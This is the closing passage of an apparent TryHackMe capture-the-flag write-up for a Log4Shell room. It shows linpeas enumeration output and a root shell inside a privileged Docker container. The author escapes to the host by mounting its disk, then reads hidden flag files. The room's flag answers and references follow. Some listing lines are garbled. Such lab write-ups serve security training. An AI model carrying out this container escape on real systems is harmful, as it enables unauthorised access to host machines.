/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.pressure_level
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.move_charge_at_immigrate
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.max_usage_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.max_usage_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.oom_control
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.stat
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.slabinfo
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.limit_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.swappiness
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.numa_stat
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.failcnt
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.max_usage_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.usage_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/tasks
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.failcnt
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.failcnt
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.limit_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/notify_on_release
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.usage_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.limit_in_bytes
/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/cgroup.clone_children
/tmp/cgroup_3628d4/docker/memory.usage_in_bytes
/tmp/cgroup_3628d4/docker/tasks
/tmp/cgroup_3628d4/docker/memory.failcnt
/tmp/cgroup_3628d4/docker/cgroup.event_control
/tmp/cgroup_3628d4/docker/memory.kmem.tcp.failcnt
/tmp/cgroup_3628d4/docker/memory.kmem.limit_in_bytes
/tmp/cgroup_3628d4/docker/notify_on_release
/tmp/cgroup_3628d4/docker/memory.kmem.usage_in_bytes
/tmp/cgroup_3628d4/docker/memory.kmem.tcp.limit_in_bytes
/tmp/cgroup_3628d4/docker/cgroup.clone_children
/tmp/cgroup_3628d4/memory.limit_in_bytes
/tmp/cgroup_3628d4/memory.numa_stat
/tmp/cgroup_3628d4/memory.kmem.failcnt
/tmp/cgroup_3628d4/memory.kmem.max_usage_in_bytes
/tmp/cgroup_3628d4/memory.usage_in_bytes
/tmp/cgroup_3628d4/tasks
/tmp/cgroup_3628d4/memory.failcnt
/tmp/cgroup_3628d4/cgroup.event_control
/tmp/cgroup_3628d4/memory.kmem.tcp.failcnt
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/cgroup.procs
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.use_hierarchy
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.tcp.usage_in_bytes
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.soft_limit_in_bytes
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.force_empty
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.pressure_level
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.move_charge_at_immigrate
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.tcp.max_usage_in_bytes
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.max_usage_in_bytes
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.oom_control
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.stat
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.slabinfo
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.limit_in_bytes
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.swappiness
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.numa_stat
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.failcnt
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.max_usage_in_bytes
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.usage_in_bytes
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/tasks
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.failcnt
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/cgroup.event_control
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.tcp.failcnt
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.limit_in_bytes
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/notify_on_release
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.usage_in_bytes
/tmp/cgroup_3628d4/system.slice/amazon-ssm-agent.service/memory.kmem.tcp.limit_in_bytes


╔══════════╣ Files inside /root (limit 20)
total 8
drwx------    2 root     root          4096 Dec 20  2018 .
drwxr-xr-x    1 root     root          4096 Dec 13  2021 ..

╔══════════╣ Files inside others home (limit 20)

╔══════════╣ Searching installed mail applications
sendmail

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)


╔══════════╣ Web files?(output limit)

╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r--    1 root     root            19 Dec 11  2021 /opt/.flag1

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x    1 root     root        828098 Jul  9 01:13 /tmp/linpeas.sh
-rw-------    1 root     root         32768 Jul  9 01:13 /tmp/hsperfdata_root/1
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/cgroup.procs
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.use_hierarchy
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.kmem.tcp.usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 00:46 /tmp/cgroup_3628d4/memory.soft_limit_in_bytes
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/cgroup.sane_behavior
--w-------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.force_empty
----------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.pressure_level
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.move_charge_at_immigrate
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.kmem.tcp.max_usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.max_usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 00:46 /tmp/cgroup_3628d4/memory.oom_control
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.stat
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/cgroup.procs
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.use_hierarchy
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.tcp.usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.soft_limit_in_bytes
--w-------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.force_empty
----------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.pressure_level
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.move_charge_at_immigrate
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.tcp.max_usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.max_usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.oom_control
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.stat
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.slabinfo
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.limit_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.swappiness
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.numa_stat
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.failcnt
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.max_usage_in_bytes
0m/tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/cgroup.procs
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.use_hierarchy
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.soft_limit_in_bytes
--w-------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.force_empty
----------    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.pressure_level
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.move_charge_at_immigrate
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.max_usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.max_usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.oom_control
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.stat
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup7f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.slabinfo
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.limit_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.swappiness
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.numa_stat
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.failcnt
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.max_usage_in_bytes
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/tasks
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.failcnt
--w--w--w-    1 root     root             0 Jul  9 00:46 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/cgroup.event_control
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.failcnt
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.limit_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/notify_on_release
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/memory.kmem.tcp.limit_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/81fbbf1def7017f9d149ed028ff0bdfdcc1f162f326584749e2c12b4fd398a3f/cgroup.clone_children
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/tasks
l  9 01:13 /tmp/cgroup_3628d4/docker/memory.failcnt
--w--w--w-    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/cgroup.event_control
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.tcp.failcnt
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.limit_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/notify_on_release
-r--r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.usage_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/memory.kmem.tcp.limit_in_bytes
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/docker/cgroup.clone_children
-rw-r--r--    1 root     root             0 Jul  9 01:13 /tmp/cgroup_3628d4/memory.limit_in_bytes

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/usr/lib/jvm/java-1.8-openjdk/jre/lib/management/jmxremote.password.template



╔══════════╣ Searching passwords inside logs (limit 70)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 


Running linpeas, we can see that privileged mode is enabled. It allows us to access the host filesystem from within the docker container. We simply have to mount the disk.

bash-4.4# fdisk -l
fdisk -l
Disk /dev/xvda: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x3650a2cc

Device     Boot Start      End  Sectors Size Id Type
/dev/xvda1 *     2048 83886046 83883999  40G 83 Linux


Disk /dev/xvdh: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/xvdf: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

bash-4.4# mkdir /tmp/realroot
mkdir /tmp/realroot
bash-4.4# ls
ls
cgroup_3628d4
f
hsperfdata_root
linpeas.sh
realroot
tomcat-docbase.8080.609427956221441513
tomcat.8080.4213912677533578857
tomcat.8080.6148304113761771648
tomcat.8080.632468063830260160
bash-4.4# mount /dev/xvda1 /tmp/realroot
mount /dev/xvda1 /tmp/realroot
bash-4.4# cd /realroot
cd /realroot
bash: cd: /realroot: No such file or directory
bash-4.4# cd realroot
cd realroot
bash-4.4# ls
ls
bin             initrd.img.old  opt             sys
boot            lib             proc            tmp
dev             lib64           root            usr
etc             lost+found      run             var
home            media           sbin            vmlinuz
initrd.img      mnt             srv             vmlinuz.old
bash-4.4# ls -lah
ls -lah
total 100
drwxr-xr-x   22 root     root        4.0K Jul  9 00:45 .
drwxrwxrwt    1 root     root        4.0K Jul  9 01:16 ..
drwxr-xr-x    2 root     root        4.0K Dec  8  2021 bin
drwxr-xr-x    3 root     root        4.0K Dec  8  2021 boot
drwxr-xr-x    4 root     root        4.0K Dec  8  2021 dev
drwxr-xr-x   94 root     root        4.0K Dec 13  2021 etc
drwxr-xr-x    3 root     root        4.0K Dec 13  2021 home
lrwxrwxrwx    1 root     root          34 Dec  8  2021 initrd.img -> boot/initrd.img-4.15.0-163-generic
lrwxrwxrwx    1 root     root          34 Dec  8  2021 initrd.img.old -> boot/initrd.img-4.15.0-163-generic
drwxr-xr-x   20 root     root        4.0K Dec 13  2021 lib
drwxr-xr-x    2 root     root        4.0K Dec  8  2021 lib64
drwx------    2 root     root       16.0K Dec  8  2021 lost+found
drwxr-xr-x    2 root     root        4.0K Dec  8  2021 media
drwxr-xr-x    2 root     root        4.0K Dec  8  2021 mnt
drwxr-xr-x    3 root     root        4.0K Dec 13  2021 opt
drwxr-xr-x    2 root     root        4.0K Apr 24  2018 proc
drwx------    4 root     root        4.0K Dec 13  2021 root
drwxr-xr-x    3 root     root        4.0K Dec  8  2021 run
drwxr-xr-x    2 root     root        4.0K Dec 13  2021 sbin
drwxr-xr-x    2 root     root        4.0K Dec  8  2021 srv
drwxr-xr-x    2 root     root        4.0K Apr 24  2018 sys
drwxrwxrwt    8 root     root        4.0K Jul  9 00:51 tmp
drwxr-xr-x   12 root     root        4.0K Dec 13  2021 usr
drwxr-xr-x   12 root     root        4.0K Dec 13  2021 var
lrwxrwxrwx    1 root     root          31 Dec  8  2021 vmlinuz -> boot/vmlinuz-4.15.0-163-generic
lrwxrwxrwx    1 root     root          31 Dec  8  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-163-generic

bash-4.4# cd root
cd root
bash-4.4# ls
ls
root.txt
bash-4.4# cat root.txt
cat root.txt
Pffft. Come on. Look harder.
bash-4.4# ls -lah
ls -lah
total 28
drwx------    4 root     root        4.0K Dec 13  2021 .
drwxr-xr-x   22 root     root        4.0K Jul  9 00:45 ..
drwxr-xr-x    2 root     root        4.0K Dec 13  2021 ...
-rw-r--r--    1 root     root        3.0K Apr  9  2018 .bashrc
-rw-r--r--    1 root     root         148 Aug 17  2015 .profile
drwx------    2 root     root        4.0K Dec 13  2021 .ssh
-r--------    1 root     root          29 Dec 13  2021 root.txt
bash-4.4# cd ...
cd ...
bash-4.4# ls
ls
bash-4.4# ls -lah
ls -lah
total 12
drwxr-xr-x    2 root     root        4.0K Dec 13  2021 .
drwx------    4 root     root        4.0K Dec 13  2021 ..
-r--------    1 root     root          26 Dec 13  2021 ._fLaG2
bash-4.4# cat ._fLaG2
cat ._fLaG2
THM{C0NT41N3R_3SC4P3_FTW}


```

What is the first flag?

You need to look around. It's hiding in plain sight. Do you use the -a option when you are listing files and directories?

*THM{LOG4SHELL_FTW}*

What is the "real" root flag?

Are you on the right HOST? Do you use "-iname" when you try to find flags? Look closer.

*THM{C0NT41N3R_3SC4P3_FTW}*

### Task 3  Credits & Reference

**References used making this room**  

- [Lunasec.io blog post on Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
- [CVE-2021-44228 – Log4j 2 Vulnerability Analysis](https://www.randori.com/blog/cve-2021-44228/)
- Malicious LDAP servers are fun. (Come on.... work for it a bit)  
    

Answer the questions below

All your log belong to us.

 Completed



[[KoTH Hackers]]